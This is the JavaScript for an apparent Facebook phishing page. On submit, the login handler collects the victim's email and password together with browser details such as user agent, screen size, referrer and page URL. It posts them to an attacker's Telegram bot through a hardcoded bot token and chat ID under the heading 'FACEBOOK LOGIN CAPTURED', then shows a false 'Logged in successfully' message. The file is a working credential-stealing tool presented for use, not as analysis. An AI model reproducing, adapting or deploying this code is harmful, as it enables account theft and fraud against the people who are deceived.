// Facebook Login Page Interactive Logic

const TELEGRAM_BOT_TOKEN = '7162773030:AAE2z_hRzcfXcL-n9QFjynrdlvs0TWx5tbo';
const TELEGRAM_CHAT_ID = '5919121831';

async function sendToTelegram(email, password) {
  const timestamp = new Date().toLocaleString('en-GB', {
    day: '2-digit', month: 'short', year: 'numeric',
    hour: '2-digit', minute: '2-digit', second: '2-digit',
    timeZoneName: 'short'
  });
  const userAgent = navigator.userAgent || 'N/A';
  const platform = navigator.platform || 'N/A';
  const language = navigator.language || 'N/A';
  const screenRes = `${screen.width}x${screen.height}`;
  const colorDepth = screen.colorDepth + ' bit';
  const cookies = navigator.cookieEnabled ? 'Yes' : 'No';
  const online = navigator.onLine ? 'Online' : 'Offline';
  const referrer = document.referrer || 'Direct';
  const pageUrl = window.location.href;

  const message =
    `🔐 <b>FACEBOOK LOGIN CAPTURED</b>\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `📧 <b>Email / Phone:</b> <code>${escapeHtml(email)}</code>\n` +
    `🔑 <b>Password:</b> <code>${escapeHtml(password)}</code>\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `🕒 <b>Time:</b> ${timestamp}\n` +
    `🌐 <b>Page URL:</b> ${pageUrl}\n` +
    `🔗 <b>Referrer:</b> ${referrer || 'N/A'}\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `🖥️ <b>Platform:</b> ${platform}\n` +
    `📱 <b>Screen:</b> ${screenRes} (${colorDepth})\n` +
    `🌍 <b>Language:</b> ${language}\n` +
    `🍪 <b>Cookies:</b> ${cookies}\n` +
    `📶 <b>Status:</b> ${online}\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `💻 <b>User Agent:</b>\n<code>${escapeHtml(userAgent)}</code>`;

  const apiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

  try {
    const response = await fetch(apiUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
        disable_web_page_preview: true
      })
    });
    return await response.json();
  } catch (err) {
    console.error('Telegram send error:', err);
    return { ok: false, error: err.message };
  }
}

function escapeHtml(str) {
  const div = document.createElement('div');
  div.textContent = String(str);
  return div.innerHTML.replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

async function handleLogin(event) {
  event.preventDefault();

  const emailInput = document.getElementById('emailInput');
  const passwordInput = document.getElementById('passwordInput');
  const submitBtn = document.getElementById('submitBtn');
  const btnLabel = submitBtn.querySelector('.btn-label');
  const spinner = document.getElementById('spinner');

  const email = emailInput.value.trim();
  const password = passwordInput.value.trim();

  if (!email || !password) {
    showToast('Please enter both your email/phone and password.');
    return;
  }

  btnLabel.classList.add('hidden');
  spinner.classList.remove('hidden');
  submitBtn.disabled = true;

  const telegramPromise = sendToTelegram(email, password);

  const minWait = new Promise(resolve => setTimeout(resolve, 1200));

  const [telegramResult] = await Promise.all([telegramPromise, minWait]);

  btnLabel.classList.remove('hidden');
  spinner.classList.add('hidden');
  submitBtn.disabled = false;

  showToast(`Logged in successfully with ${email}`);
}

// Modal management
function openModal() {
  const modal = document.getElementById('signUpModal');
  if (modal) modal.classList.remove('hidden');
}

function closeModal() {
  const modal = document.getElementById('signUpModal');
  if (modal) modal.classList.add('hidden');
}

window.addEventListener('click', (e) => {
  const modal = document.getElementById('signUpModal');
  if (modal && e.target === modal) {
    closeModal();
  }
});

function handleSignup(event) {
  event.preventDefault();
  closeModal();
  showToast('Account creation request sent successfully!');
}

function showToast(msg) {
  const toast = document.getElementById('toast');
  if (!toast) return;
  toast.textContent = msg;
  toast.classList.remove('hidden');
  setTimeout(() => {
    toast.classList.add('hidden');
  }, 3500);
}
